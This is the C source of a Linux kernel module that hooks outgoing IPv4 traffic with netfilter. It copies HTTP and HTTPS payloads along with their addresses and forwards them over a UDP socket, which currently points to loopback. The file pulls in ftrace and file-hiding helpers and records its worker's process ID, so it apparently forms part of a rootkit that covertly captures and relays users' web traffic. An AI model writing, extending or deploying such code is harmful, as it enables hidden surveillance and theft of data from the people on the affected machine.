
#include <linux/kernel.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/skbuff.h>
#include <net/ip.h>
#include <net/route.h>
#include "netfilter.h"
#include "ports.h"

#include "ftrace_helper.h"
#include "hide_files.h"


// declarations
struct packet_work
{
    char *message;
    struct work_struct work;
};
extern struct socket *sock;
static unsigned int duplicate_packet_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
static atomic_t pending_jobs = ATOMIC_INIT(0);

struct workqueue_struct *packet_wq;
// definitions
static void process_packet_work(struct work_struct *work)
{
    // copy current pid to buffer
    sprintf(packets_worker, "%d", current->pid);

    struct packet_work *packet = container_of(work, struct packet_work, work);
    char * message = packet->message;

    if (message)
    {
        //pr_info("Processing Packet:\n%s\n", packet->message);
        struct msghdr msg;
        struct kvec vec;
        struct sockaddr_in dest_addr;
        int sent_bytes;
        int len;
        len = strlen(message);
        // Set up the destination address
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(UDP_PACKETS_DEST);       // Remote port
        dest_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // Loopback for testing

        // Set up message header and iovec
        memset(&msg, 0, sizeof(msg));
        msg.msg_name = &dest_addr;
        msg.msg_namelen = sizeof(dest_addr);

        vec.iov_base = message;
        vec.iov_len = len;

        // Send the message
        sent_bytes = kernel_sendmsg(sock, &msg, &vec, 1, len);
        if (sent_bytes < 0)
        {
            pr_err("Failed to send message, error %d\n", sent_bytes);
            return;
        }

        pr_info("Sent %d bytes: %s\n from packet logger ", sent_bytes, message);
        kfree(packet->message);
    }
    atomic_dec(&pending_jobs);

    kfree(packet);
}

static unsigned int duplicate_packet_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)

{
    if (!atomic_add_unless(&pending_jobs, 1, MAX_PENDING_JOBS))
    {
        goto dec_and_ret;
    }
    struct iphdr *iph;

    struct tcphdr buffer, *tcph;
    unsigned char *payload;
    unsigned char buffer2[BUFFER_SIZE];
    unsigned int payload_len;
    char ascii_payload[BUFFER_SIZE];
    int ascii_index = 0;
    struct packet_work *work;

    // Check if the socket buffer is valid
    if (!skb)
    {
        goto dec_and_ret;
    }

    // Get the IP header
    iph = ip_hdr(skb);

    // Ensure the packet is TCP
    if (iph->protocol != IPPROTO_TCP)
        goto dec_and_ret;

    // Get the TCP header
    unsigned int offset = skb_network_offset(skb) + (iph->ihl * 4);
    tcph = skb_header_pointer(skb, offset, sizeof(buffer), &buffer);

    if (!tcph)
        goto dec_and_ret;

    // Calculate payload offset and length
    offset += tcph->doff * 4;
    payload_len = skb->len - offset;

    // Only consider HTTP/HTTPS packets (ports 80 and 443)
    if (ntohs(tcph->dest) != 80 && ntohs(tcph->dest) != 443 &&
        ntohs(tcph->source) != 80 && ntohs(tcph->source) != 443)
        goto dec_and_ret;

    // Extract payload
    if (payload_len > 0)
    {
        payload = skb_header_pointer(skb, offset, min(payload_len, BUFFER_SIZE), buffer2);

        // Convert payload to ASCII
        for (int i = 0; i < payload_len && i < BUFFER_SIZE - 1; i++)
        {
            if (payload[i] >= 32 && payload[i] <= 126)
            {
                ascii_payload[ascii_index++] = payload[i];
            }
            else
            {
                ascii_payload[ascii_index++] = '.'; // Replace non-printables with dots
            }
        }
        ascii_payload[ascii_index] = '\0'; // Null-terminate the string

        // Allocate memory for packet work
        work = kmalloc(sizeof(*work), GFP_ATOMIC);
        if (!work)
            goto dec_and_ret;

        work->message = kmalloc(BUFFER_SIZE, GFP_ATOMIC);
        if (!work->message)
        {
            kfree(work);
            goto dec_and_ret;
        }

        // Populate the message field
        snprintf(work->message, BUFFER_SIZE,
                 "HTTP/HTTPS Packet:\n"
                 "Source IP: %pI4\n"
                 "Destination IP: %pI4\n"
                 "Source Port: %u\n"
                 "Destination Port: %u\n"
                 "Payload (ASCII): %s\n",
                 &iph->saddr, &iph->daddr, ntohs(tcph->source), ntohs(tcph->dest), ascii_payload);

        // Initialize work and schedule it
        INIT_WORK(&work->work, process_packet_work);
        queue_work(packet_wq, &work->work);
    }
    return NF_ACCEPT;

dec_and_ret:
    atomic_dec(&pending_jobs);
    return NF_ACCEPT;
}

struct nf_hook_ops duplicate_packet_ops = {.hook = duplicate_packet_hook,
                                           .hooknum = NF_INET_LOCAL_OUT,
                                           .pf = PF_INET,
                                           .priority = NF_IP_PRI_FIRST};